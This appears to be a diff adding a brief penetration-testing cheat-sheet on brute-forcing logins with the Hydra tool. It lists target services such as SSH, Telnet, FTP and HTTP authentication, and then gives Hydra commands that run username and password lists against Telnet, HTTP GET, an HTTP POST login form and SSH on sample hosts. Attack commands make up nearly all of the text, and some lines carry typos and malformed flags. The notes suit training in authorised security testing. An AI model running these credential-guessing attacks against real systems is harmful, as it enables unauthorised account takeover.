@@ -1,0 +1,30 @@
+* SSH
+* Telnet
+* Remote Desktop
+* HTTP authentication
+* FTP
+* etc
+
+
+Hydra : 
+
+$ hydra -h 
+$ hydra -L userlist.txt -P passlist.txt <service://server> <options>
+$ hydra -L userlist.txt -P passlist.txt telnet://10.0.0.1:23 
+$ hydra -L userlist.txt -P passlist.txt http-get://10.0.0.1:80
+
+===============================================================================
+
+Example : http.auth || hydra -U http
+
+$ $ hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L userlist -P passlist -f(stop in fist win) V*(verbose)
+
+===============================================================================
+
+Example : ssh || hydra - U ssh
+
+$ hydra  10.0.0.5 ssh -L userlist -P passlist -f* -V* 
+
+
+
+
